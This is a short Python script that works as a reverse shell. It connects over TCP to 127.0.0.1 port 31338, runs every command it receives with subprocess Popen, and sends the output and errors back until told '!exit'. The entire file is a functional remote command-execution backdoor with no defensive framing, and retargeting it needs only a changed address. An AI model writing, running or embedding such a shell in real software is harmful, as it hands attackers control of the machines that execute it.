import socket
import shlex
from subprocess import Popen, PIPE


version = socket.AF_INET # IPV4
proto   = socket.SOCK_STREAM #TCP

sock = socket.socket(version,proto)# Our Socket
sock.connect(("127.0.0.1",31338)) #connect to socket

command = sock.recv(1024).decode() #recive data
while "!exit" not in command:
    result = Popen(shlex.split(command),stdout=PIPE,stderr=PIPE) #Run command
    data = {"output":result.stdout.read(), #output form command
        "errors":result.stderr.read()} #Errors that the command generated

    if data["errors"] != b'' and data["output"] != b'':
        out = "Error:{}\nOputput:{}".format(data["errors"].decode(),data["output"].decode()).encode()

    elif data["errors"] != b'' and data["output"] == b'':
        out = "Error:{}".format(data["errors"].decode()).encode()

    else:
        out = data["output"]
    sock.send(out) # send data:w
    command = sock.recv(1024).decode()
sock.close() # close socket
